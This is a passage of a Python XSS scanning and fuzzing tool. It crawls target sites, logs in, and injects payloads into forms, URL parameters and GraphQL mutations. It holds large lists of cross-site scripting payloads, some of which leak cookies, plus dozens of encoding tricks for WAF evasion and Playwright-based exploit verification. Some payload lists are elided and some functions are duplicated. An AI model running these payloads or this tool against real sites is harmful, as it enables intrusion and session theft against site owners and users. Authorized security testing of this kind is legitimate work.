    lambda p: p.replace('\x00',''),
    lambda p: urllib.parse.quote(urllib.parse.quote(p)),
    lambda p: "".join(f"\\{oct(ord(c))[2:]}" for c in p),                 
    lambda p: "".join(f"\\x{ord(c):02x}\\{randstr(1)}" for c in p),       
    lambda p: "\\u202E" + p[::-1] + "\\u202C",                            
    lambda p: "".join(f"&#{ord(c)};" if i%2 else c for i,c in enumerate(p)), 
    lambda p: re.sub(r'.', lambda m: f"\\u{ord(m.group(0)):04X}", p)     
]

def _expand_obf() -> List:
    exp = [
        lambda p: "".join(f"\\0{oct(ord(c))[2:]}" for c in p),
        lambda p: "".join(f"\\u{{{ord(c):04x}}}" for c in p),
        lambda p: base64.urlsafe_b64encode(p.encode()).decode('ascii','ignore'),
        lambda p: encode_to_utf32_le(p),
        lambda p: "".join(chr((ord(c)+1) % 256) for c in p),
        lambda p: "".join(chr((ord(c)-1) % 256) for c in p),
        triple_rot13,
        lambda p: p.replace("<","＜").replace(">","＞"),
        lambda p: re.sub(r"[aeiouAEIOU]", lambda m: m.group(0)+"\u200B", p),
        lambda p: codecs.encode(p,"hex_codec").decode('ascii'),
        lambda p: p[::-1].upper(),
        insert_weird_char,
        lambda p: "".join(f"\\U0000{ord(c):04X}" for c in p),
        lambda p: p.replace("<","%3C").replace(">","%3E"),
        lambda p: "".join(c for c in p if c.isalnum()),
        lambda p: p.replace(" ","%20"),
        lambda p: p.replace(" ","\t"),
        lambda p: " ".join(reversed(p.split())),
        lambda p: "".join("\\x"+hex(ord(c))[2:].zfill(2)+"\\" for c in p),
        lambda p: "\u202E"+p+"\u202C",
    ]
    for i in range(50):
        exp.append(lambda p, i=i: p + f"<!--rand{i}-->" if p else p)
    return exp

obfuscation_methods = obf_base + _expand_obf()

def polymorph(payload: str) -> str:
    return random.choice(obfuscation_methods)(payload)

# ─────────────────────────────────────────────────────────────────────────────
#  BASE PAYLOAD COLLECTIONS
# ─────────────────────────────────────────────────────────────────────────────

# CyberZeus Proprietary XSS Payloads — 100% self-contained, no external URLs
BASE_PAYLOADS = [
    # 1. Classic & Polyglot Injections
    "<svg/onload=alert(1)>",
    "<svg onload=eval(atob('YWxlcnQoMSk='))>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<script%0Aalert(1)%3B</script>",
    "<IMG SRC=JaVaScRiPt:alert(1)>",
    "<body onload=window>",
    "\"><svg><script>alert(1)</script>",
    "<iframe/src=\"data:text/html,<script>alert(1)</script>\"></iframe>",
    "<math><annotation encoding=\"application/ecmascript\">alert(1)</annotation></math>",
    "<animate onbegin=\"alert(1)\" />",
    "<details/open ontoggle=alert(1)>Clickme</details>",

    # 2. Attribute-Context Tricks
    "\" autofocus onfocus=alert(1) x=\"",
    "' onmouseover=eval(atob(\"YWxlcnQoMSk=\")) '",
    "x=';alert(1);//",
    "title=\"><svg onload=alert(1)>",
    "style=\"x:expression(alert(1))\"",
    "href=\"JaVaScRiPt:alert(1)\"",
    "src=`+document.cookie+`",

    # 3. URL-Context Vectors
    "javascript:/*–>*/alert(1)//",
    "data:text/html,<script>alert(1)</script>",
    "//google.com/?x=\\\"><script>alert(1)</script>",
    "/%0A%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "javascript:top",
    ".&#000058;&#000097;&#000108;&#000101;&#000114;&#000116;(1)",

    # 4. <script>-Block Mutations
    "';!function(){alert(1)}();//",
    "\"});alert(1);//",
    "`);fetch('javascript:alert(1)');//",
    "//--><script>alert(1)</script><!--",
    "new Function('alert(1)')();",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41));",

    # 5. CSS-Context Payloads
    "style=background:url(\"javascript:alert(1)\")",
    "expression(alert(1))",
    "behavior:url(\"javascript:alert(1)\");",
    "width:expression(alert(1));",
    "font-family:expression(alert(1));",
    "background-image:&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1);",

    # 6. Event-Handler Payloads
    "<img src=x onerror=this.onerror=0,alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<video oncanplay=alert(1) src=x>",
    "<a href=# onmouseenter=eval(atob('YWxlcnQoMSk='))>hover</a>",

    # 7. DOM-API & MutationObserver
    "<script>new MutationObserver(_=>alert(1)).observe(document,{childList:true,subtree:true});</script>",
    "<script>setTimeout(()=>alert(1),0)</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>fetch('javascript:alert(1)')</script>",

    # 8. JSON & API Tricks
    "\";alert(1);//",
    "payload\":\"<img src=x onerror=alert(1)>",
    "{\"key\":\"</script><script>alert(1)</script>\"}",
    "{\"data\":\"&#x3C;svg onload=alert(1)&#x3E;\"}",
    "{\"name\":\"`;alert(1);//`\"}",

    # 9. WAF-Bypass & Encoding
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
    "&#60;svg onload=alert(1)&#62;",
    "&#x3C;img src=x onerror=alert(1)&#x3E;",
    "<svg onload=prompt`XSS`>",
    "<iframe%20srcdoc=%3Csvg%20onload=alert(1)%3E%3C/svg%3E></iframe>",

    # 10. Blind-XSS / OOB Beacons (no external)
    "<script src=\"BEACON://TOKEN.js\"></script>",
    "<img src=\"BEACON://TOKEN.gif\">",
    "<svg><script>new Image().src=\"BEACON://\"+Date.now()</script></svg>",
    "<object data=\"BEACON://\"+encodeURIComponent(document.cookie)></object>",

    # 11. WebAssembly & Service-Worker
    "<script>WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,AGFzbQE...')).then(o=>alert(o.instance.exports._start()));</script>",
    "<script>navigator.serviceWorker.register('javascript:alert(1)').catch(()=>alert('sw'));</script>",

    # 12. Client-Side Template Injection
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "`+alert(1)+`",
    "{{\"\".constructor.alert(1)}}",

    # 13. CSP & TrustedTypes Bypass
    "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline' 'nonce-'+document.cookie\">",
    "<script>trustedTypes.createPolicy('p',{createScriptURL:()=> 'javascript:alert(1)'});</script>",

    # 14. Modern API & Cross-Protocol
    "<script>navigator.xr.requestSession('immersive-vr').then(_=>alert(1));</script>",
    "<script>new BroadcastChannel('x').postMessage('<img src=x onerror=alert(1)>');</script>",
    "file:///etc/passwd?<script>alert(1)</script>",
    "ftp://host/`+document.cookie+`",
    "ws://host/?x=<svg onload=alert(1)>",

    # 15. Encoding & Quirks
    "\\u202Ealert(1)//",
    "\\xEF\\xBB\\xBF<script>alert(1)</script>",

    # 16. GraphQL & JSON-LD
    "{\"query\":\"{user(id:\\\"1;<img src=x onerror=alert(1)>\\\")}\"}",
    "{\"@context\":{\"@vocab\":\"</script><script>alert(1)</script>\"}}",

    # 17. WebSocket & HTTP/2 Smuggling
    "<script>let ws=new WebSocket('ws://host/?x=<img src=x onerror=alert(1)>');</script>",
    "/* POST / HTTP/1.1\\r\\nHost:host\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\n<script>alert(1)</script>\\r\\n0\\r\\n */",

    # 18. Media, MathML & Interactive
    "<video src=bad onerror=alert(1)>",
    "<details open ontoggle=alert(1)>Click</details>",
    "<marquee onstart=alert(1)>Hello</marquee>",
    "<math><annotation encoding=\"application/ecmascript\">alert(1)</annotation></math>",

    # 19. Prototype Pollution & Clobbering
    "obj.__proto__.polluted='yes';alert(1)",
    "window.alert=(()=>1)&&alert(1)",

    # 20. Rare Tags & Obfuscations
    "<keygen onkeygen=alert(1)>",
    "<template>alert(1)</template>",
    "<track onerror=alert(1)>",
    "<fieldset onpointerenter=alert(1)>",
    "<svg xml:base=\"javascript:alert(1)\">",

    # Heavy network-sink probes
    "<script>let a=document.createElement`iframe`;a.srcdoc=`<svg onload=top>`;document.body.append(a)</script>",
    "<svg><script>(''+document.cookie).replace(/./g,(c,i)=>location.hash+=c)</script></svg>",
    "<script>fetch('/x',{method:'POST',body:`<img src=x onerror=alert(1)>`})</script>",
    "<script>var x=new XMLHttpRequest();x.open('POST','/x');x.send('<svg onload=alert(1)>');</script>",
    "<script>new WebSocket('ws://'+location.host+'/ws?msg=<img src=x onerror=alert(1)>');</script>",
    # DOM-sink chainers
    "<svg><script>document.documentElement.innerHTML='<img src=x onerror=alert(1)>'</script></svg>",
    "<script>setTimeout('document.write(\\'<img src=x onerror=alert(1)>\\')',1)</script>",
    # CSS & style abuse
    "<style>@keyframes x{}</style><div style=\"animation-name:x;behavior:url(javascript:alert(1))\">",
    # postMessage / Broadcast
    "<script>new BroadcastChannel('c').postMessage('<img src=x onerror=alert(1)>');</script>",
    "<iframe srcdoc='<script>parent.postMessage(`<img src=x onerror=alert(1)>`,\"*\")</script>'></iframe>",
    # CSP-breakers & module tricks
    "<script type=module>import('data:text/javascript,alert(1)')</script>",
    "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">"
]

EXTRA_BASE = [
    # Prototype & Constructor Tricks
    "__proto__[alert]=1",
    '{"__proto__":{"polluted":"CYBERZEUS"}}',
    "constructor.constructor('alert(1)')()",
    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
    '__proto__.toString="alert(1)"',

    # Anchor & URI Schemes
    '<a href="javascript:alert(1)">CyberZeusLink</a>',
    '<a href="data:text/html,<script>alert(1)</script>">DZ</a>',
    '<a href="JaVaScRiPt:alert(1)">MixedCase</a>',
    '<a href="vbscript:msgbox(\'XSS\')">VB</a>',
    '<a href="//evil/`+document.domain+`">DomainLeak</a>',

    # Image & Media Handlers
    '<img src=x onerror=alert(1)>',
    '<video src=bad onerror=alert(1)>',
    '<audio src=bad onerror=alert(1)>',
    '<img src=1 onload=alert(1)>',
    '<img src=x onerror=this.onerror=0,alert(1)>',

    # SVG & XML Vectors
    '<svg onload=alert(1)>',
    '<svg xml:base="javascript:alert(1)">',
    '<svg><script>alert(1)</script></svg>',
    '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    '<math><annotation encoding="application/ecmascript">alert(1)</annotation></math>',

    # CSS & Style Injections
    '<style>*{background:url("javascript:alert(1)");}</style>',
    '<style>li{list-style-image:url("javascript:alert(1)");}</style>',
    '<style>@import "javascript:alert(1)";</style>',
    '<div style="width:expression(alert(1))">',
    '<style onload=alert(1)></style>',

    # Event & Attribute Polyglots
    '" autofocus onfocus=alert(1) foo="',
    "' onmouseover=alert(1) '",
    '<input pattern="[A-z]*" oninvalid=alert(1)>',
    '<textarea autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',

    # Iframe & Form Exploits
    '<iframe src=javascript:alert(1)></iframe>',
    '<iframe sandbox onload=alert(1)>',
    '<form action="javascript:alert(1)"><button>Go</button></form>',
    '<button formaction="javascript:alert(1)">XSS</button>',
    '<form onsubmit=alert(1)>',

    # DOM-API & Observer
    '{{constructor.constructor(\'alert(1)\')()}}',
    '<script>new MutationObserver(_=>alert(1)).observe(document,{subtree:true});</script>',
    '<script>setTimeout(()=>alert(1),0)</script>',
    '<script>location.hash="<img src=x onerror=alert(1)>";</script>',
    '<script>Function("alert(1)")()</script>',

    # Encoding & Obfuscation
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>alert(unescape("%58%53%53"))</script>',
    '<iframe srcdoc="%3Cscript%3Ealert(1)%3C/script%3E"></iframe>',
    '<img src=x onerror=eval(decodeURIComponent("%61%6C%65%72%74%281%29"))>',
    '<svg onload=\'fetch("data:,alert(1)")\'>',

    # Advanced API & Cross-Protocol
    '<script>navigator.xr.requestSession("immersive-vr").then(_=>alert(1));</script>',
    '<script>new BroadcastChannel("x").postMessage("<img src=x onerror=alert(1)>");</script>',
    'file:///etc/passwd?<script>alert(1)</script>',
    'ws://host/?x=<svg onload=alert(1)>',
    '/%0A%3Cscript%3Ealert(1)%3C%2Fscript%3E',

    # CSP & TrustedTypes Bypass
    '<meta http-equiv="Content-Security-Policy" content="script-src \'unsafe-inline\' \'nonce-\'+document.cookie">',
    '<script>trustedTypes.createPolicy("p",{createScriptURL:()=> "javascript:alert(1)"});</script>',

    # WebAssembly & Service-Worker
    '<script>WebAssembly.instantiateStreaming(fetch("data:application/wasm;base64,AGFzbQE...")).then(o=>alert(o.instance.exports._start()));</script>',
    '<script>navigator.serviceWorker.register("javascript:alert(1)").catch(()=>alert("sw")); </script>',

    # JSON-LD & GraphQL
    '{"query":"{user(id:\\"1;<img src=x onerror=alert(1)>\\" )}"}',
    '{"@context":{"@vocab":"</script><script>alert(1)</script>"}}',

    # Smuggling & Chunked
    '/* POST / HTTP/1.1\\r\\nHost:host\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\n<script>alert(1)</script>\\r\\n0\\r\\n */',
    '<script>let ws=new WebSocket("ws://host/?x=<img src=x onerror=alert(1)>");</script>',

    # Prototype Pollution & Clobber
    "obj.__proto__.x='CYBERZEUS';alert(1)",
    "window.alert=(()=>1)&&alert(1)",

    # Rare/Interactive Tags
    '<keygen onkeygen=alert(1)>',
    '<track onerror=alert(1)>',
    '<fieldset onpointerenter=alert(1)>',
    '<dialog open oncancel=alert(1)>',
    '<template>alert(1)</template>',
]

if args.invent:
    EXTRA_BASE.append("MASK")

BASE_PAYLOADS = list(set(BASE_PAYLOADS + EXTRA_BASE))

# Stored payloads (union of v10 stored lists, uncut)
stored_payloads_v1 = [ ... ]  # FULL list from original script
stored_payloads_v2 = [ ... ]  # FULL list from original script
all_stored_payloads = list(set(stored_payloads_v1 + stored_payloads_v2))

# ─────────────────────────────────────────────────────────────────────────────
#  PAYLOAD GENERATION HELPER
# ─────────────────────────────────────────────────────────────────────────────
def pick_payload(_param_name:str)->str:
    tpl=random.choice(BASE_PAYLOADS)
    if "MASK" in tpl:
        tpl=ai_mutate(tpl)
    if args.polymorph:
        tpl=polymorph(tpl)
    return tpl

# ─────────────────────────────────────────────────────────────────────────────
#  WAF / CONTEXT DETECTION
# ─────────────────────────────────────────────────────────────────────────────
def detect_waf(url:str)->str:
    if not WafW00F:
        return "unknown"
    try:
        engine=WafW00F(url)
        engine.run()
        return engine.get_waf_name() or "unknown"
    except Exception as e:
        dbg(f"[detect_waf] {e}")
        return "unknown"

def detect_context(root:str)->Tuple[str,str]:
    waf=detect_waf(root)
    server="unknown"
    try:
        server=requests.get(root,timeout=4,verify=False).headers.get("Server","unknown")
    except Exception:
        pass
    return waf,server

# ─────────────────────────────────────────────────────────────────────────────
#  SESSION / AUTH
# ─────────────────────────────────────────────────────────────────────────────
def rotate_csrf_token(sess:requests.Session,url:str,field:str)->Optional[str]:
    try:
        r=sess.get(url,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
        m=re.search(f'name=["\']{field}["\'] value=["\']([^"\']+)["\']',r.text)
        if m: return m.group(1)
    except Exception: pass
    return None

def get_authenticated_session()->requests.Session:
    s=requests.Session()
    s.mount("https://",HTTPAdapter(pool_connections=50,pool_maxsize=50))
    s.mount("http://",HTTPAdapter(pool_connections=50,pool_maxsize=50))
    if args.login_url and args.username and args.password:
        csrf=rotate_csrf_token(s,args.login_url,args.csrf_field) or ""
        data={"username":args.username,"password":args.password}
        if csrf: data[args.csrf_field]=csrf
        try:
            r0=s.get(args.login_url,timeout=3,verify=False)
            ct=r0.headers.get("content-type","").lower()
            if "json" in ct or "/rest/" in args.login_url:
                s.post(args.login_url,json=data,headers=random_headers(),
                       timeout=HTTP_TIMEOUT,verify=False)
            else:
                s.post(args.login_url,data=data,headers=random_headers(),
                       timeout=HTTP_TIMEOUT,verify=False)
        except Exception:
            pass
    return s

SESSION=get_authenticated_session()

# Replace the sync_playwright imports with async_playwright
from playwright.async_api import async_playwright, Error as PlaywrightError

# Update your verify function to use async throughout
async def verify(url: str, method: str, data: Dict[str, Any], is_json: bool = False, headed: bool = False) -> bool:
    """Async verification function using Playwright's async API"""
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=not headed,
                args=[
                    "--disable-web-security",
                    "--ignore-certificate-errors",
                    "--no-sandbox",
                    "--disable-gpu"
                ]
            )
            context = await browser.new_context(
                ignore_https_errors=True,
                user_agent=UserAgent().random,
                java_script_enabled=True
            )

            page = await context.new_page()

            # Setup XSS detection
            await page.add_init_script("""
                window._xss_detected = false;
                const orig = window.alert;
                window.alert = function(){ window._xss_detected = true; return orig.apply(this, arguments); };
            """)

            # Replay the request
            if method.upper() == "GET":
                target = f"{url}?{urlencode(data)}" if data else url
                await page.goto(target, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            else:
                await page.goto(url, wait_until="networkidle")
                if is_json:
                    await page.evaluate(
                        """([u,d]) => fetch(u, {
                            method: 'POST',
                            headers: {'Content-Type':'application/json'},
                            body: JSON.stringify(d)
                        })""",
                        [url, data]
                    )
                else:
                    await page.evaluate(
                        """([u,d]) => fetch(u, {
                            method: 'POST',
                            headers: {'Content-Type':'application/x-www-form-urlencoded'},
                            body: new URLSearchParams(d).toString()
                        })""",
                        [url, data]
                    )
                await page.wait_for_timeout(2000)

            detected = await page.evaluate("window._xss_detected")
            if detected:
                await _save_evidence_async(page, url)
            await browser.close()
            return detected
    except Exception as e:
        logging.error(f"[verify] Playwright error: {e}")
        return False

def ensure_event_loop_policy():
    """Ensure compatible asyncio policy across platforms."""
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

def get_playwright_args():
    """Return consistent browser args across OSes."""
    return [
        "--disable-web-security",
        "--ignore-certificate-errors",
        "--no-sandbox",
        "--disable-gpu"
    ]

async def _save_evidence_async(page, url: str) -> None:
    """Save screenshot as evidence of XSS."""
    try:
        fn = f"xss_{hashlib.md5(url.encode()).hexdigest()[:8]}.png"
        path = Path("evidence") / fn
        path.parent.mkdir(exist_ok=True)
        await page.screenshot(path=str(path), full_page=True)
    except Exception as e:
        logging.debug(f"[save_evidence_async] {e}")

async def verify(url: str, method: str, data: Dict[str, Any], is_json: bool = False, headed: bool = False) -> bool:
    """Async verification function using Playwright's async API with early script injection."""
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=not headed,
                args=[
                    "--disable-web-security",
                    "--ignore-certificate-errors",
                    "--no-sandbox",
                    "--disable-gpu"
                ]
            )

            context = await browser.new_context(
                ignore_https_errors=True,
                user_agent=UserAgent().random,
                java_script_enabled=True
            )

            # ✅ Early script injection via context (not page) ensures it loads before navigation
            await context.add_init_script("""
                window._xss_detected = false;
                const orig = window.alert;
                window.alert = function() {
                    window._xss_detected = true;
                    return orig.apply(this, arguments);
                };
            """)

            page = await context.new_page()

            if method.upper() == "GET":
                target = f"{url}?{urlencode(data)}" if data else url
                await page.goto(target, timeout=VERIFY_TIMEOUT, wait_until="networkidle")

            else:
                await page.goto(url, timeout=VERIFY_TIMEOUT, wait_until="domcontentloaded")
                await page.wait_for_timeout(500)  # Let page JS settle

                fetch_script = """([u, d]) => fetch(u, {
                    method: 'POST',
                    headers: {
                        'Content-Type': '%s'
                    },
                    body: %s
                })""" % (
                    "application/json" if is_json else "application/x-www-form-urlencoded",
                    "JSON.stringify(d)" if is_json else "new URLSearchParams(d).toString()"
                )

                await page.evaluate(fetch_script, [url, data])
                await page.wait_for_timeout(2000)  # Allow DOM/script time to trigger alert()

            detected = await page.evaluate("window._xss_detected")

            if detected:
                await _save_evidence_async(page, url)

            await browser.close()
            return detected

    except PlaywrightError as e:
        logging.error(f"[verify] PlaywrightError: {e}")
    except Exception as e:
        logging.error(f"[verify] Unexpected error: {e}")
    return False

async def run_dom_analysis(
    urls: Set[str],
    reporter,
    headed: bool
):
    """DOM XSS scanning using async Playwright."""
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=not headed,
                args=get_playwright_args()
            )
            context = await browser.new_context(ignore_https_errors=True)
            page = await context.new_page()

            analyzer = DomXssAnalyzer(page)
            failure_count = 0

            for url in urls:
                success = False
                for wait in ("networkidle", "load", "domcontentloaded"):
                    try:
                        await page.goto(url, timeout=VERIFY_TIMEOUT, wait_until=wait)
                        success = True
                        break
                    except PlaywrightError as e:
                        logging.warning(f"[DOM] goto '{wait}' timed out for {url}: {e}")

                if not success:
                    logging.error(f"[DOM] All goto attempts failed for {url}, skipping.")
                    failure_count += 1
                    if failure_count >= 10:
                        logging.info("[DOM] Too many timeouts, aborting DOM analysis.")
                        break
                    continue

                analyzer.vulns.clear()
                await analyzer.analyze()

                for vuln in analyzer.vulns:
                    detailed_evidence = (
                        f"Sink: {vuln['sink']} on <{vuln['tag']} id='{vuln['id']}' class='{vuln['cls']}'>\n"
                        f"Attribute: {vuln.get('attr')}\n"
                        f"Payload: {vuln['payload']}\n"
                        f"Stack trace:\n{vuln['stack']}"
                    )

                    reporter.add_finding(
                        url=url,
                        param="DOM",
                        payload=vuln["payload"],
                        vuln_type="DOM XSS",
                        evidence=detailed_evidence
                    )

            await browser.close()
    except Exception as e:
        logging.error(f"[run_dom_analysis] Error: {e}")



def verify_reflection_fallback(
    url: str,
    method: str,
    data: Dict[str, Any],
    is_json: bool
) -> bool:
    """Reflection heuristic via basic response echoing."""
    try:
        import requests  # uses SESSION if available
        if method.upper() == "GET":
            r = requests.get(url, params=data, timeout=HTTP_TIMEOUT)
        else:
            r = requests.post(url, json=data if is_json else None, data=None if is_json else data, timeout=HTTP_TIMEOUT)
        return any(str(v) in r.text for v in data.values())
    except Exception:
        return False

# ─────────────────────────────────────────────────────────────────────────────
#  FINDINGS LOG / SARIF / SLACK
# ─────────────────────────────────────────────────────────────────────────────
log_lock=threading.Lock()
sarif_lock=threading.Lock()
_hits:set[str]=set()
sarif_results:List[Dict[str,Any]]=[]

if not LOGFILE.exists():
    LOGFILE.write_text(f"# Noctua Findings v{VERSION}\n\n","utf-8")

def log_hit(url:str,method:str,payload:str,params:List[str]|None=None,extra:str="")->None:
    params=params or []
    entry=f"- **XSS** {method} `{url}` param={params} payload=`{payload}` {extra}\n"
    with log_lock:
        if entry in _hits: return
        _hits.add(entry)
        LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry,"utf-8")
    logging.info(entry.strip())
    if SLACK_WEBHOOK_URL:
        try: requests.post(SLACK_WEBHOOK_URL,json={"text":entry},timeout=5)
        except Exception: pass
    if SARIF_OUTPUT_FILE:
        with sarif_lock:
            sarif_results.append({
              "ruleId":"XSS","level":"error",
              "message":{"text":f"XSS param={params}"},
              "locations":[{"physicalLocation":{"artifactLocation":{"uri":url}}}]
            })

def write_sarif():
    if not sarif_results or not SARIF_OUTPUT_FILE: return
    sarif={"$schema":"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-2.1.0.json",
           "version":"2.1.0","runs":[{"tool":{"driver":{"name":"Noctua","version":VERSION}},"results":sarif_results}]}
    with open(SARIF_OUTPUT_FILE,"w",encoding="utf-8") as f: json.dump(sarif,f,indent=2)

# ─────────────────────────────────────────────────────────────────────────────
#  CHUNKED / HTTP‑2 SENDER
# ─────────────────────────────────────────────────────────────────────────────
def chunked_fuzz_request(url:str,method:str,headers:Dict[str,str],body:str):
    if not httpx:
        return requests.get(url,headers=headers,timeout=HTTP_TIMEOUT,verify=False) if method=="GET" else \
               requests.post(url,data=body,headers=headers,timeout=HTTP_TIMEOUT,verify=False)
    try:
        with httpx.Client(http2=True,verify=False,timeout=HTTP_TIMEOUT) as c:
            return c.get(url,headers=headers) if method=="GET" else c.post(url,data=body,headers=headers)
    except Exception: pass
    def gen(b:str):
        idx=0
        while idx<len(b):
            sz=random.randint(1,8)
            yield b[idx:idx+sz]; idx+=sz
    try:
        with httpx.Client(verify=False,timeout=HTTP_TIMEOUT) as c:
            return c.get(url,headers={**headers,"Transfer-Encoding":"chunked"}) if method=="GET" else \
                   c.post(url,data=gen(body),headers={**headers,"Transfer-Encoding":"chunked"})
    except Exception as e:
        dbg(f"[chunked_fuzz] {e}")
        return requests.get(url,headers=headers,timeout=HTTP_TIMEOUT,verify=False) if method=="GET" else \
               requests.post(url,data=body,headers=headers,timeout=HTTP_TIMEOUT,verify=False)

# ─────────────────────────────────────────────────────────────────────────────
#  TARGET CRAWLING HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def mine_js(url:str,host:str)->List[str]:
    found=[]
    try:
        txt=SESSION.get(url,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).text
        js_call=re.compile(r'(fetch\(["\']|axios\.\w+\(["\']|WebSocket\(["\']|import\(["\'])'
                           r'(/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|html?)(?:\?[^"\']*)?)["\']',re.I)
        js_url=re.compile(r'["\'](/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|html?)(?:\?[^"\']*)?)["\']',re.I)
        for m in js_call.findall(txt)+js_url.findall(txt):
            if isinstance(m,tuple): m=[x for x in m if x]
            for u in ([m] if isinstance(m,str) else m):
                full=urllib.parse.urljoin(url,u); 
                if urllib.parse.urlparse(full).netloc.lower()==host: found.append(full)
    except Exception: pass
    return list(set(found))

def misc_assets(root:str)->List[str]:
    base=urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
    assets=[]
    try:
        txt=SESSION.get(base+"/robots.txt",headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).text
        for line in txt.splitlines():
            if line.lower().startswith("sitemap:"): assets.append(line.split(":",1)[1].strip())
    except Exception: pass
    return assets

def parse_html_forms_links(url:str,html:str)->List[Dict[str,Any]]:
    soup=BeautifulSoup(html,"html.parser"); host=urllib.parse.urlparse(url).netloc.lower(); res=[]
    if args.crawl_iframes:
        for ifr in soup.find_all("iframe",src=True):
            src=urllib.parse.urljoin(url,ifr["src"])
            if urllib.parse.urlparse(src).netloc.lower()==host: res.append({"iframe":src})
    for a in soup.find_all("a",href=True):
        link=urllib.parse.urljoin(url,a["href"]); pu=urllib.parse.urlparse(link)
        if pu.netloc.lower()==host:
            params=list(urllib.parse.parse_qs(pu.query).keys())
            res.append({"url":pu._replace(query="").geturl(),"method":"GET","params":params})
    for f in soup.find_all("form"):
        action=f.get("action") or url
        full=urllib.parse.urljoin(url,action); pu=urllib.parse.urlparse(full)
        if pu.netloc.lower()==host:
            method=f.get("method","GET").upper()
            params=[inp.get("name") for inp in f.find_all(["input","textarea","select"]) if inp.get("name")]
            res.append({"url":pu._replace(query="").geturl(),"method":method,"params":params})
    # manifest
    for l in soup.find_all("link",rel="manifest",href=True):
        mani=urllib.parse.urljoin(url,l["href"])
        try:
            j=SESSION.get(mani,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False).json()
            for k in ("start_url","scope"):
                if k in j:
                    u=urllib.parse.urljoin(mani,j[k])
                    if urllib.parse.urlparse(u).netloc.lower()==host:
                        res.append({"url":u,"method":"GET","params":[]})
        except Exception: pass
    return res

def crawl_static(root:str,cap:int,visited:set[str]|None=None)->List[Dict[str,Any]]:
    visited=visited or set(); host=urllib.parse.urlparse(root).netloc.lower()
    def norm(u:str)->str:
        p=urllib.parse.urlparse(u)._replace(query="",fragment="")
        path=re.sub(r'/+','/',p.path)
        if path.endswith('/') and path!='/': path=path[:-1]
        return p._replace(path=path).geturl().lower()
    queue=[root]+misc_assets(root); results=[]
    while queue and len(visited)<cap:
        u=queue.pop(0); sig=norm(u)
        if sig in visited: continue
        visited.add(sig)
        ext=Path(urllib.parse.urlparse(sig).path).suffix.lstrip('.').lower()
        if ext in static_exts: continue
        try:
            r=SESSION.get(u,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
            if r.status_code>=400: continue
        except Exception: continue
        ct=r.headers.get("content-type","").lower()
        if "javascript" in ct:
            for jurl in mine_js(u,host):
                if norm(jurl) not in visited: queue.append(jurl)
            continue
        if "html" not in ct and not u.endswith(".html"): continue
        for nt in parse_html_forms_links(u,r.text):
            lurl=nt.get("url") or nt.get("iframe"); mth=nt.get("method","GET").upper()
            params=nt.get("params",[])
            if not lurl: continue
            key=f"{mth}:{norm(lurl)}:{','.join(sorted(params))}"
            if key not in visited:
                visited.add(key); results.append(nt)
                if norm(lurl) not in visited: queue.append(lurl)
    return results


def normalize_url(u: str) -> str:
    p = urllib.parse.urlparse(u)
    return p._replace(query="", fragment="").geturl().lower()

from playwright.async_api import async_playwright, Error as PlaywrightError
from urllib.parse import urlparse
import json, logging





def normalize_url(u: str) -> str:
    p = urllib.parse.urlparse(u)
    return p._replace(query="", fragment="").geturl().lower()





# ─────────────────────────────────────────────────────────────────────────────
#  GRAPHQL FUZZING
# ─────────────────────────────────────────────────────────────────────────────
INTROSPECTION="""query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name type{kind name ofType{kind}}}}}}}"""
def discover_graphql_ops(ep:str)->List[Tuple[str,List[str]]]:
    try:
        j=SESSION.post(ep,json={"query":INTROSPECTION},timeout=HTTP_TIMEOUT,verify=False).json()
        schema=j["data"]["__schema"]; ops=[]
        for kind in ("queryType","mutationType"):
            root=schema.get(kind); 
            if not root: continue
            for t in schema["types"]:
                if t["name"]==root["name"]:
                    for f in t["fields"]:
                        arg_names=[a["name"] for a in f["args"] if a["type"]["name"]=="String"]
                        if arg_names: ops.append((f["name"],arg_names))
        return ops
    except Exception: return []

def fuzz_graphql(ep:str)->None:
    for name,args_ in discover_graphql_ops(ep):
        for a in args_:
            pay="<img src=x onerror=alert(1)>"
            try:
                SESSION.post(ep,json={"query":f"mutation{{{name}({a}:\"{pay}\"){{__typename}}}}"},
                             timeout=HTTP_TIMEOUT,verify=False)
            except Exception as e:
                dbg(f"[fuzz_graphql] {e}")

# ─────────────────────────────────────────────────────────────────────────────
#  HTTP / WS FUZZERS
# ─────────────────────────────────────────────────────────────────────────────
global_visited_http:set[str]=set()

def set_deep(obj:Any,path:str,val:str)->None:
